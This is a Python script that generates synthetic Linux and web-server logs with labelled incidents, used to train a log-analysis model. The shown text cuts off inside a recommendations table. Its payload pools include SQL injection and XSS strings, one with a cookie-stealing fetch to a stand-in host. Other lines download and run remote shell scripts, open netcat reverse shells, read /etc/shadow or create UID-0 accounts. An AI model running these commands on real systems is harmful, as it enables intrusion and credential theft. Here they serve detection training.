#!/usr/bin/env python3
"""Synthetic Linux log generator with exact ground truth for training a log-analysis LLM.

Each sample = a chunk of logs (nginx/apache access+error, auth/sshd/sudo, ufw, dmesg,
systemd/syslog, fail2ban) with injected attacks/incidents + benign noise, and a target
answer computed from the generator's own labels (never from an LLM).

Usage: python gen.py --n 40000 --seed 1 --out data/train.jsonl [--split test]
"""
import argparse, json, random, re, string, datetime as dt
from collections import Counter, OrderedDict

IP_RE = re.compile(r"(?<![\d.:])(?:25[0-5]|2[0-4]\d|1?\d?\d)(?:\.(?:25[0-5]|2[0-4]\d|1?\d?\d)){3}(?![\d.])")
SEV_RANK = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
MONTHS = "Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split()

# --------------------------------------------------------------------------- pools
FIRST = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy", "mallory",
         "oscar", "peggy", "trent", "victor", "walter", "deploy", "ubuntu", "admin", "jenkins", "git",
         "backup", "www-data", "postgres", "marc", "julie", "pierre", "sophie", "nico", "lea", "tom",
         "ansible", "devops", "ops", "sysadmin", "rleo", "kevin", "sarah", "ahmed", "yuki", "chen"]
INVALID_USERS = ["admin", "test", "user", "oracle", "guest", "ftpuser", "pi", "ubnt", "support", "postgres",
                 "mysql", "git", "hadoop", "minecraft", "steam", "nagios", "testuser", "administrator",
                 "user1", "debian", "centos", "ec2-user", "zabbix", "tomcat", "jenkins", "elastic", "dev",
                 "teamspeak", "odoo", "vagrant", "es", "redis", "default", "service", "operator", "info",
                 "sales", "www", "web", "ftp", "solana", "sol", "validator", "node", "kafka", "deployer"]
HOSTS = ["web01", "srv-prod", "vps-4421", "nginx-edge", "api-1", "db02", "mail", "bastion", "app-server",
         "ubuntu", "debian", "lab", "node3", "gw", "fileserver", "kube-worker-2", "homelab", "monitor"]
DOMAINS = ["example.com", "shop.example.org", "api.acme.io", "blog.dev.net", "intranet.local", "myapp.fr",
           "cdn.site.com", "portal.corp.eu", "status.app.io", "www.boulangerie-dupont.fr"]
PAGES = ["/", "/index.html", "/about", "/contact", "/blog/", "/blog/2024/hello-world", "/products",
         "/products/42", "/cart", "/api/v1/users/me", "/api/v1/items?page=2", "/login", "/search?q=shoes",
         "/search?q=linux+kernel", "/docs/install", "/pricing", "/api/health", "/favicon.ico", "/robots.txt",
         "/sitemap.xml", "/feed.xml", "/en/faq", "/fr/accueil", "/account/settings", "/api/v2/orders/1187",
         "/static/js/app.3f9a1.js", "/static/css/main.css", "/images/logo.png", "/images/hero.webp",
         "/assets/fonts/inter.woff2", "/blog/tags/security", "/api/v1/search?q=select+a+plan",
         "/events?date=2024-05-01", "/download/report.pdf", "/news/union-select-committee-meeting"]
ASSETS = ["/static/js/app.3f9a1.js", "/static/css/main.css", "/images/logo.png", "/images/hero.webp",
          "/assets/fonts/inter.woff2", "/favicon.ico", "/static/js/vendor.88c2.js", "/img/banner.jpg"]
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
       "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
       "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36",
       "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
       "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
       "curl/8.5.0", "Uptime-Kuma/1.23.11", "kube-probe/1.29", "Prometheus/2.51.0",
       "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0"]
SCANNER_UAS = {"sqlmap": "sqlmap/1.8.3#stable (https://sqlmap.org)", "nikto": "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000562)",
               "nuclei": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Nuclei",
               "zgrab": "Mozilla/5.0 zgrab/0.x", "masscan": "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
               "nmap": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
               "wpscan": "WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)", "gobuster": "gobuster/3.6",
               "dirbuster": "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)",
               "ffuf": "Fuzz Faster U Fool v2.1.0-dev", "acunetix": "Mozilla/5.0 (Windows NT 10.0) acunetix-wvs-test-for-some-inexistent-file"}
SQLI = ["?id=1' OR '1'='1", "?id=1%27%20OR%20%271%27%3D%271", "?id=1 UNION SELECT username,password FROM users--",
        "?id=-1%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(0x7176,user(),0x7170)--%20-", "?cat=2' AND SLEEP(5)--",
        "?q=%27%3B%20DROP%20TABLE%20users%3B--", "?user=admin'--", "?id=1)%20AND%201=CONVERT(int,(SELECT%20@@version))--",
        "?search=1' AND extractvalue(1,concat(0x7e,database()))--", "?id=1%20AND%201%3D1", "?id=1' ORDER BY 10-- -",
        "?page=1;WAITFOR DELAY '0:0:5'--", "?id=1'+AnD+(SeLeCt+1+FrOm+(SeLeCt+SlEeP(3))a)--+", "?pid=1 or 1=1#",
        "?sort=name%20ASC%2C(SELECT%201%20FROM%20pg_sleep(5))", "?id=1%27%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables--"]
SQLI_PATHS = ["/products.php", "/item", "/index.php", "/api/v1/items", "/news.php", "/catalog", "/view.php", "/search"]
XSS = ["?q=<script>alert(1)</script>", "?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", "?name=<img src=x onerror=alert(1)>",
       "?redirect=javascript:alert(1)", "?s=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E", "?msg=<body onload=fetch('//evil.tld/'+document.cookie)>",
       "?q=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E", "?term=\"><script src=//xss.ht/a.js></script>"]
TRAVERSAL = ["/../../../../etc/passwd", "/static/..%2f..%2f..%2f..%2fetc%2fpasswd", "/download?file=../../../../etc/shadow",
             "/index.php?page=....//....//....//etc/passwd", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
             "/img?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts", "/view?template=../../../../proc/self/environ",
             "/index.php?file=php://filter/convert.base64-encode/resource=index.php", "/?lang=../../../../../../windows/win.ini",
             "/include.php?page=http://evil.example.net/shell.txt", "/assets/..;/..;/WEB-INF/web.xml"]
CMDI = ["/cgi-bin/ping.cgi?host=127.0.0.1;cat%20/etc/passwd", "/api/exec?cmd=id", "/?cmd=wget%20http://45.9.148.3/x.sh%20-O-%7Csh",
        "/shell?cmd=uname%20-a", "/index.php?c=system('id')", "/diag?ip=8.8.8.8|nc%20-e%20/bin/sh%2091.92.1.4%204444",
        "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E/tmp/x)",
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://1.2.3.4/Mozi.m+-O+/tmp/netgear;sh+netgear",
        "/boaform/admin/formLogin?username=admin&psd=admin", "/?a=$(curl%20http://185.12.4.9/b|bash)"]
SENSITIVE = ["/.env", "/.git/config", "/.git/HEAD", "/wp-config.php.bak", "/config.php~", "/.aws/credentials", "/backup.sql",
             "/db.sql.gz", "/.DS_Store", "/server-status", "/phpinfo.php", "/.htpasswd", "/admin/.env", "/api/.env",
             "/.svn/entries", "/web.config", "/config.json", "/.ssh/id_rsa", "/actuator/env", "/debug/pprof/",
             "/.vscode/sftp.json", "/docker-compose.yml", "/storage/logs/laravel.log", "/.npmrc", "/id_rsa"]
WP_PROBES = ["/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/wp-content/plugins/revslider/temp/update_extract/",
             "/wp-includes/wlwmanifest.xml", "/wordpress/wp-admin/setup-config.php", "/wp-json/wp/v2/users",
             "/phpmyadmin/", "/pma/index.php", "/admin/login.php", "/administrator/index.php", "/mysql/admin/",
             "/HNAP1/", "/boaform/admin/formLogin", "/cgi-bin/luci", "/solr/admin/info/system", "/manager/html",
             "/owa/auth/logon.aspx", "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
             "/vendor/phpunit/phpunit/LICENSE", "/geoserver/web/", "/.well-known/security.txt", "/console/", "/jenkins/login"]
WEBSHELLS = ["/wp-content/uploads/2024/05/cache.php", "/uploads/avatar_x.php", "/images/.sys.php", "/tmp/up.php",
             "/wp-content/plugins/hello/shell.php", "/files/c99.php", "/assets/img/1.phtml", "/media/wso.php"]
WEBSHELL_QS = ["?cmd=id", "?c=whoami", "?x=ls+-la", "", "?act=upload", "?pass=k8&cmd=cat+/etc/passwd", ""]
DMESG_BOOT = ["Linux version 6.8.0-{k}-generic (buildd@lcy02-amd64-0{a}) (x86_64-linux-gnu-gcc-13) #{b}-Ubuntu SMP PREEMPT_DYNAMIC",
              "Command line: BOOT_IMAGE=/vmlinuz-6.8.0-{k}-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro quiet splash",
              "x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'", "BIOS-provided physical RAM map:",
              "ACPI: Early table checksum verification disabled", "PCI: Using configuration type 1 for base access",
              "clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b3e459bf4c", "Memory: 65701236K/67012612K available",
              "NET: Registered PF_INET6 protocol family", "EXT4-fs (dm-0): mounted filesystem 3f1c1d0e-8a1b-4b2e-9d0a-2e6c8a9b7f01 r/w with ordered data mode. Quota mode: none.",
              "e1000e 0000:00:1f.6 eno1: NIC Link is Up 1000 Mbps Full Duplex, Flow Control: Rx/Tx",
              "IPv6: ADDRCONF(NETDEV_CHANGE): eno1: link becomes ready", "nvme nvme0: 16/0/0 default/read/poll queues",
              " nvme0n1: p1 p2 p3", "audit: type=1400 audit({t}:2): apparmor=\"STATUS\" operation=\"profile_load\" profile=\"unconfined\" name=\"lsb_release\" pid={p} comm=\"apparmor_parser\"",
              "Bluetooth: Core ver 2.22", "systemd[1]: Started systemd-journald.service - Journal Service.",
              "r8169 0000:03:00.0 enp3s0: Link is Up - 1Gbps/Full - flow control rx/tx", "usbcore: registered new interface driver usbhid",
              "input: Logitech USB Receiver as /devices/pci0000:00/0000:00:14.0/usb1/1-3/1-3:1.0/0003:046D:C52B.0001/input/input5",
              "wireguard: WireGuard 1.0.0 loaded. See www.wireguard.com for information.", "loop0: detected capacity change from 0 to 8",
              "kauditd_printk_skb: 23 callbacks suppressed", "br-3f2a1c9d7e11: port 1(veth9a1b2c3) entered forwarding state",
              "docker0: port 1(vethd41e2a7) entered blocking state", "NVRM: loading NVIDIA UNIX x86_64 Kernel Module  570.172.08",
              "EXT4-fs (sda1): re-mounted 7c3e2a10-11b2-4c3d-8e9f-0a1b2c3d4e5f. Quota mode: none.", "zram0: detected capacity change from 0 to 16777216"]
DMESG_EXTRA = ["ACPI: LAPIC_NMI (acpi_id[0x{p:x}] high edge lint[0x1])", "pci 0000:00:{a:02d}.0: Adding to iommu group {b}",
               "BIOS-e820: [mem 0x000000000009f000-0x00000000000fffff] reserved", "pci 0000:00:02.0: BAR 0 [mem 0x6000000000-0x6000ffffff 64bit]",
               "iwlwifi 0000:00:14.3: WFPM_UMAC_PD_NOTIFICATION: 0x20", "wlo1: authenticate with 3c:84:6a:12:9b:01 (local address=f4:7b:09:aa:10:2c)",
               "wlo1: associated", "wlo1: 80 MHz not supported, disabling VHT", "snd_hda_intel 0000:00:1f.3: DSP detected with PCI class/subclass/prog-if info 0x040380",
               "scsi host{a}: ahci", "PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]", "ACPI: Dynamic OEM Table Load:",
               "Bluetooth: hci0: Firmware revision 0.0 build {b} week 42 2024", "rfkill: input handler disabled", "EXT4-fs (nvme0n1p2): mounted filesystem with ordered data mode",
               "Adding 8388604k swap on /swap.img.  Priority:-2 extents:6 across:8650748k SS", "nvidia-modeset: Loading NVIDIA Kernel Mode Setting Driver for UNIX platforms  570.172.08",
               "Initializing XFRM netlink socket", "bridge: filtering via arp/ip/ip6tables is no longer available by default", "evm: HMAC attrs: 0x1",
               "veth{b}: renamed from eth0", "TCP: enp3s0: Driver has suspect GRO implementation, TCP performance may be compromised.",
               "reserve setup_data: [mem 0x0000000000100000-0x000000003fffffff] usable", "BIOS-e820: [mem 0x0000000000000000-0x000000000009efff] usable",
               "ACPI: Reserving SSDT table memory at [mem 0x3c8f6000-0x3c8f8fe2]", "pci 0000:00:1f.6: [8086:15fa] type 00 class 0x020000 PCIe Root Complex Integrated Endpoint",
               "smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900K (family: 0x6, model: 0xb7, stepping: 0x1)", "Spectre V2 : Mitigation: Enhanced / Automatic IBRS",
               "x86/cpu: SGX disabled or unsupported by BIOS.", "tsc: Refined TSC clocksource calibration: 2995.199 MHz", "ACPI: \\_SB_.PC00.PEG1.PEGP: Disabling ACPI",
               "i915 0000:00:02.0: [drm] GT0: GuC firmware i915/tgl_guc_70.bin version 70.20.0", "Freeing unused kernel image (initmem) memory: 4960K",
               "random: crng init done", "Run /init as init process", "secureboot: Secure boot disabled", "Kernel command line: BOOT_IMAGE=/vmlinuz root=UUID=1b2c ro quiet splash",
               "workqueue: drm_fb_helper_damage_work hogged CPU for >10000us 4 times, consider switching to WQ_UNBOUND", "audit: type=1334 audit({t}:{a}): prog-id={b} op=LOAD"]
BENIGN_CRON = ["test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }", "/usr/local/bin/backup.sh >/dev/null 2>&1",
               "php /var/www/html/cron.php", "   cd / && run-parts --report /etc/cron.hourly", "certbot -q renew",
               "[ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi",
               "command -v debian-sa1 > /dev/null && debian-sa1 1 1", "command -v debian-sa1 > /dev/null && debian-sa1 60 2",
               "[ -x /usr/sbin/update-openssh-known-hosts ] && { sleep `od -An -N1 -tu1 /dev/urandom`; /usr/sbin/update-openssh-known-hosts; }",
               "test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r", "/usr/bin/flock -n /tmp/backup.lock /usr/local/bin/backup.sh",
               "cd /srv/app && /usr/bin/docker compose pull -q >/dev/null 2>&1", "/usr/bin/curl -fsS -m 10 --retry 3 https://hc-ping.com/5f1e2a10-uuid > /dev/null",
               "/usr/bin/find /tmp -type f -mtime +7 -delete", "/usr/sbin/logrotate /etc/logrotate.conf", "pg_dump mydb | gzip > /var/backups/db.sql.gz"]
SERVICES = ["nginx.service", "apache2.service", "postgresql.service", "docker.service", "mysql.service", "redis-server.service",
            "php8.3-fpm.service", "gunicorn.service", "node-app.service", "cron.service", "fail2ban.service", "ssh.service",
            "certbot.service", "grafana-server.service", "prometheus.service", "containerd.service"]
PROCS = ["php-fpm8.3", "node", "java", "python3", "mysqld", "postgres", "chrome", "gunicorn", "ffmpeg", "redis-server",
         "elasticsearch", "llama-server", "dotnet", "ruby", "clickhouse-serv"]
SUSP_SUDO = ["/usr/bin/curl -s http://{ip}/i.sh -o /tmp/i.sh", "/bin/bash -c curl http://{ip}/x|bash", "/usr/bin/chmod 4755 /bin/bash",
             "/usr/bin/cat /etc/shadow", "/usr/sbin/useradd -o -u 0 -g 0 sysupd", "/usr/bin/vim /etc/sudoers",
             "/usr/bin/nc -lvnp 4444 -e /bin/bash", "/usr/bin/wget http://{ip}/kworker -O /usr/local/bin/kworker",
             "/usr/bin/crontab -e", "/usr/bin/systemctl disable --now ufw", "/usr/sbin/ufw disable", "/usr/bin/base64 -d /tmp/.x",
             "/usr/bin/tee -a /root/.ssh/authorized_keys", "/usr/sbin/iptables -F"]
NORMAL_SUDO = ["/usr/bin/apt update", "/usr/bin/apt upgrade -y", "/usr/bin/systemctl restart nginx", "/usr/bin/systemctl status docker",
               "/usr/bin/journalctl -u nginx --since today", "/usr/bin/tail -f /var/log/syslog", "/usr/bin/docker ps",
               "/usr/sbin/ufw status", "/usr/bin/certbot renew", "/usr/bin/du -sh /var/log", "/usr/bin/nano /etc/nginx/sites-available/default",
               "/usr/bin/systemctl reload apache2", "/usr/bin/apt install htop"]
LANG_CHOICES = ["en"] * 3 + ["fr"]


# --------------------------------------------------------------------------- helpers
class R(random.Random):
    def pub_ip(self):
        while True:
            a = self.choice([self.randint(1, 223)] * 3 + [45, 185, 91, 103, 141, 194, 80, 5, 61, 218, 222, 117, 179, 193])
            if a in (10, 127, 0, 169, 172, 192, 100, 224) or a >= 224:
                continue
            return f"{a}.{self.randint(0, 255)}.{self.randint(0, 255)}.{self.randint(1, 254)}"

    def priv_ip(self):
        return self.choice([f"192.168.{self.randint(0, 3)}.{self.randint(2, 250)}", f"10.0.{self.randint(0, 20)}.{self.randint(2, 250)}",
                            f"172.{self.randint(16, 31)}.{self.randint(0, 255)}.{self.randint(2, 250)}"])

    def port(self):
        return self.randint(1024, 65535)


def ts_fmt(t, kind, tz="+0000"):
    if kind == "clf":
        return f"{t.day:02d}/{MONTHS[t.month - 1]}/{t.year}:{t:%H:%M:%S} {tz}"
    if kind == "nginx_err":
        return t.strftime("%Y/%m/%d %H:%M:%S")
    if kind == "apache_err":
        return t.strftime("%a %b %d %H:%M:%S.") + f"{t.microsecond:06d} {t.year}"
    if kind == "syslog":
        return f"{MONTHS[t.month - 1]} {t.day:>2} {t:%H:%M:%S}"
    if kind == "syslog0":
        return f"{MONTHS[t.month - 1]} {t.day:02d} {t:%H:%M:%S}"
    if kind == "iso_s":
        return t.strftime("%Y-%m-%dT%H:%M:%S") + (tz[:3] + ":" + tz[3:])
    if kind == "iso":
        return t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond:06d}" + (tz[:3] + ":" + tz[3:])
    if kind == "dmesg_T":
        return t.strftime("%a %b %d %H:%M:%S %Y")
    if kind == "f2b":
        return t.strftime("%Y-%m-%d %H:%M:%S,") + f"{t.microsecond // 1000:03d}"
    raise ValueError(kind)


class Line:
    __slots__ = ("t", "text", "src", "fid", "meta", "ts")

    def __init__(self, t, text, src, ts, fid=None, **meta):
        self.t, self.text, self.src, self.ts, self.fid, self.meta = t, text, src, ts, fid, meta


class Finding:
    def __init__(self, category, severity, source, status, ips=(), users=(), extra=None):
        self.category, self.severity, self.source, self.status = category, severity, source, status
        self.ips, self.users = list(ips), list(users)
        self.extra = extra or {}
        self.lines = []

    @property
    def count(self):
        return sum(1 for l in self.lines if not l.meta.get("nc"))


# --------------------------------------------------------------------------- descriptions (EN / FR)
def describe(f, lang):
    n = f.count
    ip = ", ".join(f.ips[:4]) + (f" (+{len(f.ips) - 4} more)" if len(f.ips) > 4 else "") if f.ips else "?"
    usr = ", ".join(f.users[:5]) + (f" (+{len(f.users) - 5})" if len(f.users) > 5 else "") if f.users else ""
    e = f.extra
    stat_en = {"blocked": "all requests were rejected", "attempted": "no sign of success",
               "possibly_successful": "some requests returned 200, possible success", "successful": "the action succeeded",
               "observed": "event observed"}[f.status]
    stat_fr = {"blocked": "toutes les requêtes ont été rejetées", "attempted": "aucun signe de réussite",
               "possibly_successful": "certaines requêtes ont répondu 200, réussite possible", "successful": "l'action a réussi",
               "observed": "événement constaté"}[f.status]
    D = {
        "sql_injection": (f"{n} SQL injection attempts from {ip} against {e.get('target', 'the web app')}; {stat_en}.",
                          f"{n} tentatives d'injection SQL depuis {ip} sur {e.get('target', 'l’application web')} ; {stat_fr}."),
        "xss": (f"{n} cross-site scripting (XSS) payloads sent by {ip}; {stat_en}.",
                f"{n} charges XSS (cross-site scripting) envoyées par {ip} ; {stat_fr}."),
        "path_traversal": (f"{n} path traversal / file inclusion attempts from {ip} trying to read system files; {stat_en}.",
                           f"{n} tentatives de traversée de répertoire / inclusion de fichier depuis {ip} pour lire des fichiers système ; {stat_fr}."),
        "command_injection": (f"{n} remote command injection / RCE attempts from {ip}; {stat_en}.",
                              f"{n} tentatives d'injection de commandes / RCE depuis {ip} ; {stat_fr}."),
        "log4shell": (f"{n} Log4Shell (CVE-2021-44228) JNDI exploitation attempts from {ip}; {stat_en}.",
                      f"{n} tentatives d'exploitation Log4Shell (CVE-2021-44228) via JNDI depuis {ip} ; {stat_fr}."),
        "shellshock": (f"{n} Shellshock (CVE-2014-6271) attempts from {ip} via crafted headers; {stat_en}.",
                       f"{n} tentatives Shellshock (CVE-2014-6271) depuis {ip} via des en-têtes forgés ; {stat_fr}."),
        "vulnerability_scanner": (f"Automated vulnerability scan by {ip} ({e.get('tool', 'scanner')}), {n} requests; {stat_en}.",
                                  f"Scan de vulnérabilités automatisé par {ip} ({e.get('tool', 'scanner')}), {n} requêtes ; {stat_fr}."),
        "sensitive_file_probe": (f"{ip} probed for {n} sensitive files (.env, .git, backups, keys); {stat_en}.",
                                 f"{ip} a cherché {n} fichiers sensibles (.env, .git, sauvegardes, clés) ; {stat_fr}."),
        "cms_admin_probe": (f"{ip} probed {n} CMS/admin endpoints (WordPress, phpMyAdmin, routers); {stat_en}.",
                            f"{ip} a sondé {n} points d'entrée CMS/admin (WordPress, phpMyAdmin, routeurs) ; {stat_fr}."),
        "web_brute_force": (f"{n} login attempts on {e.get('target', '/login')} from {ip}; {stat_en}.",
                            f"{n} tentatives de connexion sur {e.get('target', '/login')} depuis {ip} ; {stat_fr}."),
        "webshell_access": (f"Requests from {ip} to a suspicious script in an upload directory ({e.get('target')}) returned 200: likely web shell.",
                            f"Requêtes de {ip} vers un script suspect dans un dossier d'upload ({e.get('target')}) avec réponse 200 : web shell probable."),
        "http_flood": (f"{ip} sent {n} requests in {e.get('secs', '?')}s, possible HTTP flood / aggressive crawler.",
                       f"{ip} a envoyé {n} requêtes en {e.get('secs', '?')} s, flood HTTP / robot agressif possible."),
        "server_errors": (f"{n} server-side errors (5xx / upstream failures) on {e.get('target', 'the backend')}.",
                          f"{n} erreurs côté serveur (5xx / backend en échec) sur {e.get('target', 'le backend')}."),
        "ssh_brute_force": (f"{n} failed SSH logins from {ip}" + (f" targeting {usr}" if usr else "") + f"; {stat_en}.",
                            f"{n} échecs de connexion SSH depuis {ip}" + (f" visant {usr}" if usr else "") + f" ; {stat_fr}."),
        "ssh_user_enumeration": (f"{ip} tried {len(f.users)} non-existent usernames over SSH ({usr}).",
                                 f"{ip} a essayé {len(f.users)} noms d'utilisateur inexistants en SSH ({usr})."),
        "distributed_ssh_brute_force": (f"Distributed SSH brute force: {len(f.ips)} IPs, {n} failed logins for {usr or 'several users'}.",
                                        f"Brute force SSH distribué : {len(f.ips)} IP, {n} échecs de connexion pour {usr or 'plusieurs utilisateurs'}."),
        "compromised_account": (f"Successful SSH login for '{usr}' from {ip} after {e.get('fails', '?')} failed attempts: account likely compromised.",
                                f"Connexion SSH réussie pour « {usr} » depuis {ip} après {e.get('fails', '?')} échecs : compte probablement compromis."),
        "root_login": (f"Direct root SSH login accepted from {ip}.", f"Connexion SSH directe en root acceptée depuis {ip}."),
        "unusual_login": (f"Login for '{usr}' from an unusual external IP {ip} at {e.get('when', 'an unusual hour')}.",
                          f"Connexion de « {usr} » depuis une IP externe inhabituelle {ip} à {e.get('when', 'une heure inhabituelle')}."),
        "privilege_escalation_attempt": (f"User '{usr}' (not in sudoers) tried to run sudo {n} time(s).",
                                         f"L'utilisateur « {usr} » (absent de sudoers) a tenté sudo {n} fois."),
        "sudo_auth_failure": (f"{n} failed sudo password attempts by '{usr}'.", f"{n} échecs de mot de passe sudo pour « {usr} »."),
        "suspicious_sudo_command": (f"User '{usr}' ran suspicious privileged command(s): {e.get('cmd', '')}.",
                                    f"L'utilisateur « {usr} » a exécuté des commandes privilégiées suspectes : {e.get('cmd', '')}."),
        "account_created": (f"New account '{usr}' created" + (" with UID 0 (root-equivalent)" if e.get("uid0") else "") + (" and added to sudo" if e.get("sudo") else "") + ".",
                            f"Nouveau compte « {usr} » créé" + (" avec UID 0 (équivalent root)" if e.get("uid0") else "") + (" et ajouté à sudo" if e.get("sudo") else "") + "."),
        "port_scan": (f"Port scan from {ip}: {len(e.get('ports', []))} distinct ports probed, blocked by UFW.",
                      f"Scan de ports depuis {ip} : {len(e.get('ports', []))} ports distincts sondés, bloqués par UFW."),
        "repeated_blocked_connections": (f"{n} blocked connection attempts from {ip} to port {e.get('port')}/{e.get('proto', 'TCP')}.",
                                         f"{n} tentatives de connexion bloquées depuis {ip} vers le port {e.get('port')}/{e.get('proto', 'TCP')}."),
        "oom_kill": (f"Out-of-memory killer terminated {e.get('proc')} (pid {e.get('pid')}); the system ran out of RAM.",
                     f"L'OOM killer a tué {e.get('proc')} (pid {e.get('pid')}) ; le système a manqué de RAM."),
        "segfault": (f"{e.get('proc')} crashed with a segmentation fault ({n} event(s)).",
                     f"{e.get('proc')} a planté avec une erreur de segmentation ({n} événement(s))."),
        "disk_error": (f"Storage I/O errors on {e.get('dev')} ({n} lines): possible failing disk or filesystem corruption.",
                       f"Erreurs d'E/S sur {e.get('dev')} ({n} lignes) : disque défaillant ou corruption du système de fichiers possible."),
        "hardware_error": (f"Hardware error reported by the kernel ({e.get('kind', 'MCE')}).",
                           f"Erreur matérielle signalée par le noyau ({e.get('kind', 'MCE')})."),
        "kernel_oops": (f"Kernel oops/BUG ({e.get('kind')}): kernel instability, possible driver bug or exploit attempt.",
                        f"Oops/BUG du noyau ({e.get('kind')}) : instabilité du noyau, bug de pilote ou tentative d'exploit possible."),
        "syn_flood": (f"Possible SYN flood on port {e.get('port')} detected by the kernel.",
                      f"Possible SYN flood sur le port {e.get('port')} détecté par le noyau."),
        "conntrack_full": ("nf_conntrack table full, packets dropped: possible DoS or connection exhaustion.",
                           "Table nf_conntrack pleine, paquets rejetés : DoS ou saturation des connexions possible."),
        "unsigned_module": (f"Unsigned/out-of-tree kernel module '{e.get('mod')}' loaded, kernel tainted.",
                            f"Module noyau non signé '{e.get('mod')}' chargé, noyau marqué « tainted »."),
        "apparmor_denied": (f"AppArmor denied {n} operation(s) by {e.get('proc')} on {e.get('target')}.",
                            f"AppArmor a refusé {n} opération(s) de {e.get('proc')} sur {e.get('target')}."),
        "usb_device": (f"New USB storage device attached ({e.get('dev')}).", f"Nouveau périphérique de stockage USB branché ({e.get('dev')})."),
        "service_failure": (f"Service {e.get('svc')} failed ({e.get('why', 'exit-code')}).", f"Le service {e.get('svc')} a échoué ({e.get('why', 'exit-code')})."),
        "suspicious_cron": (f"Cron job for '{usr}' runs a suspicious command: {e.get('cmd')}.",
                            f"Tâche cron de « {usr} » exécutant une commande suspecte : {e.get('cmd')}."),
        "ssh_scan": (f"SSH protocol probing / banner scanning from {ip} ({n} connections, no authentication attempted).",
                     f"Sondage du protocole SSH / scan de bannière depuis {ip} ({n} connexions, sans tentative d'authentification)."),
        "fail2ban_ban": (f"fail2ban banned {len(f.ips)} IP(s) in jail [{e.get('jail', 'sshd')}]: {ip}.",
                         f"fail2ban a banni {len(f.ips)} IP dans la jail [{e.get('jail', 'sshd')}] : {ip}."),
        "firewall_disabled": ("The UFW firewall was disabled/stopped.", "Le pare-feu UFW a été désactivé/arrêté."),
    }
    en, fr = D[f.category]
    return fr if lang == "fr" else en


RECS = {
    "sql_injection": ("Use parameterized queries, validate input and enable a WAF rule set (e.g. OWASP CRS); block {ip}.",
                      "Utiliser des requêtes paramétrées, valider les entrées et activer un WAF (ex. OWASP CRS) ; bloquer {ip}."),
    "xss": ("Encode output, add a Content-Security-Policy header and sanitize user input.",
            "Encoder les sorties, ajouter un en-tête Content-Security-Policy et assainir les entrées."),
    "path_traversal": ("Normalize and whitelist file paths, disable remote includes (allow_url_include=Off); block {ip}.",
                       "Normaliser et filtrer les chemins de fichiers, désactiver les inclusions distantes ; bloquer {ip}."),
    "command_injection": ("Never pass user input to a shell, patch the targeted component, check for dropped files in /tmp; block {ip}.",
                          "Ne jamais passer d'entrée utilisateur à un shell, corriger le composant visé, vérifier /tmp ; bloquer {ip}."),
    "log4shell": ("Upgrade Log4j to 2.17.1+ on all Java services and block outbound LDAP/RMI.",
                  "Mettre à jour Log4j en 2.17.1+ sur les services Java et bloquer LDAP/RMI sortant."),
    "shellshock": ("Update bash and disable unneeded CGI scripts.", "Mettre à jour bash et désactiver les scripts CGI inutiles."),
    "vulnerability_scanner": ("Rate-limit or block {ip}; make sure the scanned paths are not exposed.",
                              "Limiter ou bloquer {ip} ; vérifier que les chemins scannés ne sont pas exposés."),
    "sensitive_file_probe": ("Deny access to dotfiles and backups in the web server config (e.g. location ~ /\\. {{ deny all; }}).",
                             "Interdire l'accès aux fichiers cachés et sauvegardes dans la config du serveur web (ex. location ~ /\\. {{ deny all; }})."),
    "cms_admin_probe": ("Restrict admin panels by IP or VPN and keep the CMS and plugins updated.",
                        "Restreindre les interfaces d'admin par IP ou VPN et maintenir le CMS et ses plugins à jour."),
    "web_brute_force": ("Add rate limiting / captcha on the login form and enable fail2ban for it.",
                        "Ajouter une limitation de débit / captcha sur le formulaire de connexion et un filtre fail2ban."),
